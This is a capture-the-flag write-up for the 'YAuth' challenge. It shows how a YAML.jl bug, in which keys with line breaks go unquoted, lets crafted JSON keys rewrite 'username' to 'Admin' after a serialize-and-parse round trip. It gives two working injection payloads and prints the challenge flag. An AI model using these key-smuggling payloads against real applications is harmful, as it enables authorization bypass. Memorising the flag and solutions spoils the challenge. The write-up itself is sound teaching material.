# YAuth

[日本語版はこちら](./README-ja.md)

## Description

Going back and forth

## Writeup

### Overview

```julia
data = JSON.parse(body, Dict{String, Any})
data["username"] = "Guest"

yaml = YAML.write(data)
result = YAML.load(yaml, yaml_constructors)

if result["username"] == "Admin"
    result["flag"] = flag
end

println(JSON.json(result))
```

Intuitively, `YAML.load(YAML.write(data))` and `data` should represent the same data. However, this challenge requires you to create an input such that, when serialized and then deserialized, `data["username"]` turns from `Guest` to `Admin`.

### Solution

The bug lies in the logic of how YAML.jl determines whether a key needs to be quoted when serializing (See [here](https://github.com/JuliaData/YAML.jl/blob/f43e80285d127f1a02d4508e4ba6858534c45575/src/writer.jl#L103)):

```julia
function string_key_needs_quoting(s::AbstractString)
    isempty(s) && return true
    occursin('#', s) && return true
    occursin(':', s) && return true
    occursin(' ', s) && return true
    first(s) in "{}[]&*?|-+.<>=!%@:`,\"'" && return true
    isdigit(first(s)) && return true
    s in ("true", "True", "TRUE", "false", "False", "FALSE") && return true
    return false
end
```

As you can see, it doesn't check for line breaks. This means that if you serialize the following object:

```json
{
    "\nfoo": "bar"
}
```

it will be written as:

```yaml

foo: bar
```

which will then be deserialized to:

```json
{
    "foo": "bar"
}
```

Hence, you can write `{"\nusername": "Admin"}`, which will be deserialized into `{"username": "Admin"}`. Now, the next step is to bypass the `strict_unique_keys` check. There are two intended ways to do this:

### Solution 1

According to [this code](https://github.com/JuliaData/YAML.jl/blob/f43e80285d127f1a02d4508e4ba6858534c45575/src/constructor.jl#L205), `strict_unique_keys` is not checked if the object is merged using `<<`. Hence, `{"\n<<": {"x": "y"}, "\nusername": "Admin"}` would bypass the `strict_unique_keys` check. YAML.jl prioritizes the latter value if there are duplicate keys, so you need to make sure that `\nusername` comes after `username`. You can do this by trial and error, and keys like `\nusername\r` will work.

```
{"\n<<": {"x": "y"}, "\nusername\r": "Admin"}
```

### Solution 2

In YAML, you can use `---` to split a file into multiple documents. However, `YAML.load` only parses the first document. (To parse multiple documents, you need to use `YAML.load_all`.) You can use this fact to make `"username": "Guest"` appear in the second document.

```
{"\n\n---\nusername": "Admin", "\n\n---\nx": "a"}
```

## Flag
`Alpaca{Y4ML_is_to0_compl3x_7o_implemen7_pr0perly_:(}`
